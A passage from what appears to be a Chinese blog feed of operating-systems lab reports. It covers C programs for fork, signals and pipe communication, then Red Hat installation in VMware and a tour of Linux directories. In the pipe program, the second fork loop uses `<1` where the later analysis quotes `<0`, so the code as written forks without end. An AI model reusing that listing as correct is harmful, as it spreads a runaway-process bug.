class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waiting</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> wait_mark;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> p1,p2;<span class="comment">/*定义两个进程号变量*/</span></span><br><span class="line">   <span class="keyword">while</span>((p1=fork())&lt;<span class="number">0</span>);<span class="comment">/*创建子进程p1*/</span></span><br><span class="line">   <span class="keyword">if</span>(p1&gt;<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="keyword">while</span>((p2=fork())&lt;<span class="number">0</span>);<span class="comment">/*创建子进程p2*/</span></span><br><span class="line">       <span class="keyword">if</span>(p2&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"Father PID:%d\n"</span>,getpid());</span><br><span class="line">           wait_mark=<span class="number">1</span>;<span class="comment">/*不往下执行，直到捕捉到键盘上传来的信号*/</span></span><br><span class="line">           signal(SIGINT,<span class="built_in">stop</span>);<span class="comment">/*接收到^c信号，转stop*/</span></span><br><span class="line">           waiting();</span><br><span class="line">           kill(p1,<span class="number">16</span>);<span class="comment">/*向p1发软中断信号16*/</span></span><br><span class="line">           kill(p2,<span class="number">17</span>);<span class="comment">/*向p2发软中断信号17*/</span></span><br><span class="line">           wait(<span class="number">0</span>);<span class="comment">/*同步*/</span></span><br><span class="line">           wait(<span class="number">0</span>);</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"Parent process is killed!\n"</span>);</span><br><span class="line">           <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"Child2 PID:%d\n"</span>,getpid());</span><br><span class="line">           wait_mark=<span class="number">1</span>;</span><br><span class="line">           signal(<span class="number">17</span>,<span class="built_in">stop</span>);<span class="comment">/*接收到软中断信号17，转stop*/</span></span><br><span class="line">           signal(SIGINT,SIG_IGN);<span class="comment">/*屏蔽从键盘上传来的中断信号，使得子进程可以接收到父进程传来的软中断信号*/</span></span><br><span class="line">           waiting();<span class="comment">/*不往下执行*/</span></span><br><span class="line">           lockf(<span class="built_in">stdout</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"Child process 2 is killed by parent!\n"</span>);</span><br><span class="line">           lockf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">           <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Child1 PID:%d\n"</span>,getpid());</span><br><span class="line">       wait_mark=<span class="number">1</span>;</span><br><span class="line">       signal(<span class="number">16</span>,<span class="built_in">stop</span>);<span class="comment">/*接收到软中断信号16，转stop*/</span></span><br><span class="line">       signal(SIGINT,SIG_IGN);<span class="comment">/*屏蔽从键盘上传来的中断信号，使得子进程可以接收到父进程传来的软中断信号*/</span></span><br><span class="line">       waiting();<span class="comment">/*不往下执行*/</span></span><br><span class="line">       lockf(<span class="built_in">stdout</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Child process 1 is killed by parent!\n"</span>);</span><br><span class="line">       lockf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waiting</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(wait_mark!=<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>&#123;</span><br><span class="line">wait_mark=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570071904980.png"><h3 id="运行结果分析"><a href="#运行结果分析" class="headerlink" title="运行结果分析"></a>运行结果分析</h3><p>​        程序运行两次，软中断后，结果输出顺序不相同。理论上，父程序在同一时间下达指令，软中断子程序1和子程序2并发执行，并发执行并不是同时执行，而可能是交叉执行，两个子程序执行完成时间不一致，即第一次运行程序2先完成，第二次运行程序1先完成。</p><h2 id="编制实现进程的管道通信的程序"><a href="#编制实现进程的管道通信的程序" class="headerlink" title="编制实现进程的管道通信的程序"></a>编制实现进程的管道通信的程序</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>使用系统调用pipe()建立一条管道线，两个子进程分别向管道写一句话：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Child <span class="built_in">process</span> <span class="number">1</span> is sending a message!  </span><br><span class="line">Child <span class="built_in">process</span> <span class="number">2</span> is sending a message!</span><br></pre></td></tr></table></figure><p>父进程从管道中先后读出来自于两个子进程p1、p2的消息，显示在屏幕上。</p><h3 id="程序流程图-1"><a href="#程序流程图-1" class="headerlink" title="程序流程图"></a>程序流程图</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570080232148.png" width="50%" height="50%"><h3 id="程序源代码-1"><a href="#程序源代码-1" class="headerlink" title="程序源代码"></a>程序源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pid1,pid2;<span class="comment">/*定义两个进程号变量*/</span></span><br><span class="line"> </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Father PID:%d\n"</span>,getpid());</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> outpipe[<span class="number">100</span>],inpipe[<span class="number">100</span>];<span class="comment">/*定义两个字符数组*/</span></span><br><span class="line">    pipe(fd);<span class="comment">/*创建一个管道*/</span></span><br><span class="line">    <span class="keyword">while</span> ((pid1=fork())&lt;<span class="number">0</span>);<span class="comment">/*如果进程1创建不成功,则空循环*/</span></span><br><span class="line">    <span class="keyword">if</span>(pid1==<span class="number">0</span>)&#123;<span class="comment">/*如果子进程1创建成功,pid1为进程号*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Child1 PID:%d\n"</span>,getpid());</span><br><span class="line">        lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);<span class="comment">/*锁定管道*/</span></span><br><span class="line">        <span class="built_in">sprintf</span>(outpipe,<span class="string">"child 1 process is sending message!"</span>);<span class="comment">/*把串放入数组outpipe中*/</span></span><br><span class="line">        <span class="built_in">write</span>(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);    <span class="comment">/*向管道写长为50字节的串*/</span></span><br><span class="line">        lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);<span class="comment">/*解除管道的锁定*/</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">/*结束进程1*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span> ((pid2=fork())&lt;<span class="number">1</span>);<span class="comment">/*若进程2创建不成功,则空循环*/</span></span><br><span class="line">        <span class="keyword">if</span>(pid2==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Child2 PID:%d\n"</span>,getpid());</span><br><span class="line">            lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);       <span class="comment">/*锁定管道*/</span></span><br><span class="line">            <span class="built_in">sprintf</span>(outpipe,<span class="string">"child 2 process is sending message!"</span>);</span><br><span class="line">            <span class="built_in">write</span>(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);</span><br><span class="line">            lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);<span class="comment">/*解除管道的锁定*/</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">/*结束进程2*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            wait(<span class="number">0</span>);                <span class="comment">/*同步，等待子进程1结束*/</span></span><br><span class="line">            <span class="built_in">read</span>(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);  <span class="comment">/*从管道中读长为50字节的串*/</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,inpipe);<span class="comment">/*显示读出的数据*/</span></span><br><span class="line">            wait(<span class="number">0</span>);<span class="comment">/*同步，等待子进程2结束*/</span></span><br><span class="line">            <span class="built_in">read</span>(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);  <span class="comment">/*从管道中读长为50字节的串*/</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,inpipe);<span class="comment">/*显示读出的数据*/</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">/*结束父进程*/</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序运行结果-1"><a href="#程序运行结果-1" class="headerlink" title="程序运行结果"></a>程序运行结果</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570078674032.png"><h3 id="运行结果分析-1"><a href="#运行结果分析-1" class="headerlink" title="运行结果分析"></a>运行结果分析</h3><p>根据对源代码的注释分析，父进程必须先接收子程序1的消息，再接收子程序2的消息。因此必须先创建成功子程序1，再创建子程序2，这里用到了两个while()循环如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((pid1=fork())&lt;<span class="number">0</span>);<span class="comment">/*如果进程1创建不成功,则空循环*/</span></span><br><span class="line"><span class="keyword">while</span> ((pid2=fork())&lt;<span class="number">0</span>);<span class="comment">/*如果进程2创建不成功,则空循环*/</span></span><br></pre></td></tr></table></figure><p>因此会先打印出子程序1的PID和消息，再打印子程序2的PID和消息。</p><h1 id="实验难点与收获"><a href="#实验难点与收获" class="headerlink" title="实验难点与收获"></a>实验难点与收获</h1><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol><li>对并发执行的理解；</li><li>对管道通信过程的学习等；</li></ol><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>学习了进程管理的相关函数如fork()、wait()、kill()、signal()、pipe()等的使用；</li><li>知道了并发执行并不是同一时间执行两个程序，对并发有了更确切的理解；</li><li>深入理解了进程互斥的概念；</li><li>了解了Linux系统中进程通信的基本原理等；</li></ol><h1 id="实验思考"><a href="#实验思考" class="headerlink" title="实验思考"></a>实验思考</h1><p>通过这次实验，我对操作系统进程管理的内容有了更深入的理解。在linx操作系统中，进程的创建需要调用fork函数，该函数调用一次，返回两次。深入理解了进程互斥的概念，即两个或两个以上的进程,不能同时进入关于同一组共享变量的临界区域。进程互斥通过lockf()来实现。通过kill()函数和signal()函数深入理解进程的之间的软中断。前者是发送软中断信号，后者是接收软中断信号。通过pipe()函数理解进程之间的管道通信。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux进程管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核-实验一</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%80.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%80.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>安装<code>Red Hat Linux</code>。</li><li>熟悉<code>Linux</code>目录结构以及目录功能简介。</li><li>熟悉<code>Linux</code>系统的基本操作。</li><li><code>Vi</code>的熟悉与使用。</li><li>安装并使用<code>Linux</code>的编译器<code>GCC</code>，编写一个能通过编译且运行成功的小程序。<a id="more"></a></li></ol><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="VMware-workstation-安装Red-Hat-Linux"><a href="#VMware-workstation-安装Red-Hat-Linux" class="headerlink" title="VMware workstation 安装Red Hat Linux"></a><code>VMware workstation</code> 安装<code>Red Hat Linux</code></h2><ol><li><p>打开<code>VMware workstation</code>，一次选择“<strong>文件→新建虚拟机→自定义安装→下一步</strong>”，选择稍后安装操作系统，点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image004.jpg" alt="img"></p></li><li><p>选择客户机操作系统为<code>Linux</code>，版本为<code>Red Hat Enterprise 6 64位</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image006.jpg" alt="img"></p></li><li><p>命名虚拟机为：<code>Red Hat Enterprise 6 64位</code>，设置虚拟机路径点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image008.jpg" alt="img"></p></li><li><p>配置处理器数量为1，每个处理器的内核内核数量为1，点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image010.jpg" alt="img"></p></li><li><p>设置虚拟机内存为<code>2GB</code>，点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image012.jpg" alt="img"></p></li><li><p>设置网络类型为<code>NAT</code>模式，点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image014.jpg" alt="img"></p></li><li><p>选择I/O控制器类型为<code>LSI Logic</code>，磁盘类型为<code>SCSI</code>,点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image016.jpg" alt="img"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image018.jpg" alt="img"></p></li><li><p>选择创建新的虚拟磁盘，磁盘大小为<code>20GB</code>，将磁盘拆分成多个文件，点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image020.jpg" alt="img"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image022.jpg" alt="img"></p></li><li><p>命名指定磁盘文件，点击下一步；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image024.jpg" alt="img"></p></li><li><p>点击自定义硬件，添加虚拟机ISO镜像路径，设备状态设置为已连接，否则无法检测到镜像，然后点击安装完成；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image026.jpg" alt="img"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image028.jpg" alt="img"></p></li><li><p>打开虚拟机，<code>Install or upgrade an existing system</code>进入图形安装界面；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image030.jpg" alt="img"></p></li><li><p>开始测试硬盘，选择OK；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image032.jpg" alt="img"></p></li><li><p>测试完成后进入安装界面，开始安装；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image034.jpg" alt="img"></p></li><li><p>选择语言为中文简体；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image036.jpg" alt="img"></p></li><li><p>选择安装键盘为美国英语式；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image038.jpg" alt="img"></p></li><li><p>选择安装将使用基本存储设备；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image040.jpg" alt="img"></p></li><li><p>提示存储设备警告，选择忽略所有数据；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image042.jpg" alt="img"></p></li><li><p>明明计算机为<code>localhost.leeyuxun</code>，网络设置选择有线<code>system the0；</code></p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image044.jpg" alt="img"></p></li><li><p>时区设置为上海；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image046.jpg" alt="img"></p></li><li><p>设置跟用户密码；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image048.jpg" alt="img"></p></li><li><p>安装种类选择创建自定义布局；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image050.jpg" alt="img"></p></li><li><p>创建一个<code>200M</code>的<code>ext4</code>分区，挂载到<code>/boot</code>下，依次点击<strong>创建→标准分区→创建</strong>，挂载点选择<code>/boot</code>；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image052.jpg" alt="img"></p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image054.jpg" alt="img"></p></li><li><p>用上述方法创建一个<code>swap</code>分区，不设置挂载点，大小为内存的2倍即4GB，再创建一个<code>ext4</code>分区，挂载到/目录下，选择“使用全部可用空间”；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image056.jpg" alt="img"></p></li><li><p>然后选择<strong>格式化→将修改写入磁盘</strong>，点击下一步；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image058.jpg" alt="img"></p></li><li><p>基本服务器安装软件组选择桌面，存储库选择自定义；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image060.jpg" alt="img"></p></li><li><p>左侧选择桌面，右侧全部选择；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image062.jpg" alt="img"></p></li><li><p>左侧选择开发，右侧选择桌面平台开发和开发工具；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image064.jpg" alt="img"></p></li><li><p>语言支持选择世界语和中文；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image066.jpg" alt="img"></p></li><li><p>点击下一步开始安装软件包；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image068.jpg" alt="img"></p></li><li><p>安装完成后选择重新引导；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image070.jpg" alt="img"></p></li><li><p>同意许可证信息；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image072.jpg" alt="img"></p></li><li><p>设置用户米、全名、密码，创建用户；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image074.jpg" alt="img"></p></li><li><p>设置日期和时间；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image074.jpg" alt="img"></p></li><li><p>设置<code>Kdump</code>内存为<code>128M</code>；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image078.jpg" alt="img"></p></li><li><p>重启后进入桌面，显示如下，安装完成；</p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image080.jpg" alt="img"></p><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image082.jpg" alt="img"></p></li></ol><h2 id="熟悉Linux目录结构以及目录功能简介"><a href="#熟悉Linux目录结构以及目录功能简介" class="headerlink" title="熟悉Linux目录结构以及目录功能简介"></a>熟悉<code>Linux</code>目录结构以及目录功能简介</h2><ol><li><p>安装<code>tree</code>，在打开终端，顶级目录下输入<code>tree -L 1</code>，输出一级目录如下，包括文件夹有：<code>bin</code>、<code>boot</code>、<code>dev</code>、<code>etc</code>、<code>home</code>、<code>lib</code>、<code>lost+found</code>、<code>media</code>、<code>misc</code>、<code>mnt</code>、<code>opt</code>、<code>proc</code>、<code>root</code>、<code>sbin</code>、<code>selinux</code>、<code>srv</code>、<code>sys</code>、<code>tmp</code>、<code>usr</code>、<code>var</code>等；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image084.jpg" alt="img"></p></li><li><p>分析每个文件夹功能：</p><ol><li><p><code>/bin</code><br>文件内容如下，用于存放使用者最经常使用的命令，如：<code>cat</code>、<code>ls</code>、<code>vi</code>等<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image086.jpg" alt="img"></p></li><li><p><code>/boot</code><br>文件内容如下，这里存放的是启动<code>Linux</code>时使用的一些核心文件，包括一些连接文件以及镜像文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image088.jpg" alt="img"></p></li><li><p><code>/dev</code><br>文件内容如下，<code>dev</code>是<strong>Device(设备)</strong>的缩写，该目录下存放的是<code>Linux</code>的外部设备，在<code>Linux</code>中访问设备的方式和访问文件的方式是相同的；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image090.jpg" alt="img"></p></li><li><p><code>/etc</code><br>文件内容如下，这个目录用来存放所有的系统管理所需要的配置文件和子目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image092.jpg" alt="img"></p></li><li><p><code>/home</code><br>文件内容如下，是用户的主目录，在<code>Linux</code>中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，前面提到该机器用户的用户名为<code>levi</code>；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image094.jpg" alt="img"></p><ol><li><p><code>/lib</code><br>文件内容如下，这个目录里存放着系统最基本的动态连接共享库，其作用类似于<code>Windows</code>里的<code>DLL</code>文件。几乎所有的应用程序都需要用到这些共享库。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image096.jpg" alt="img"></p></li><li><p><code>/lost+found</code><br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件；</p></li><li><p><code>/media</code><br><code>Linux</code>系统会自动识别一些设备，例如U盘、光驱等等，当识别后，<code>Linux</code>会把识别的设备挂载到这个目录下；</p></li><li><p><code>/misc</code><br>该目录自动挂载服务目录，对应<code>autofs</code>服务；</p></li><li><p><code>/mnt</code><br>目录内容如下，系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在<code>/mnt</code>上，然后进入该目录就可以查看光驱里的内容了。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image098.jpg" alt="img"></p></li><li><p><code>/opt</code><br>文件内容如下，这是给主机额外安装软件所摆放的目录。比如安装一个<code>ORACLE</code>数据库则就可以放到这个目录下，默认是空的；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image100.jpg" alt="img"></p></li><li><p><code>/proc</code><br>这个目录的内容不在硬盘上而是在内存里，可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的<code>ping</code>命令，使别人无法<code>ping</code>该机器；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure></li><li><p><code>/root</code><br>文件目录如下，该目录为系统管理员，也称作超级权限者的用户主目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image102.jpg" alt="img"></p></li><li><p><code>/sbin</code><br>文件目录如下，<code>s</code>就是<code>Super User</code>的意思，这里存放的是系统管理员使用的系统管理程序；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image104.jpg" alt="img"></p></li><li><p><code>/selinux</code><br> 文件目录如下，这个目录是<code>Redhat/CentOS</code>所特有的目录，<code>Selinux</code>是一个安全机制，类似于<code>windows</code>的防火墙，但是这套机制比较复杂，这个目录就是存放<code>selinux</code>相关的文件的；<br> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image106.jpg" alt="img"></p></li><li><p><code>/srv</code><br>  该目录存放一些服务启动之后需要提取的数据；</p></li><li><p><code>/sys</code><br>  文件目录如下，这是<code>linux2.6</code>内核的一个很大的变化，该目录下安装了<code>2.6</code>内核中新出现的一个文件系统<code>sysfs</code>，<code>sysfs</code>文件系统集成了下面3种文件系统的信息：针对进程信息的<code>proc</code>文件系统、针对设备的<code>devfs</code>文件系统以及针对伪终端的<code>devpts</code>文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建；<br>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image108.jpg" alt="img"></p></li><li><p><code>/tmp</code><br>  这个目录是用来存放一些临时文件的；</p></li><li><p><code>/usr</code><br>  这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于<code>windows</code>下的<code>program files</code>目录；<br>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image110.jpg" 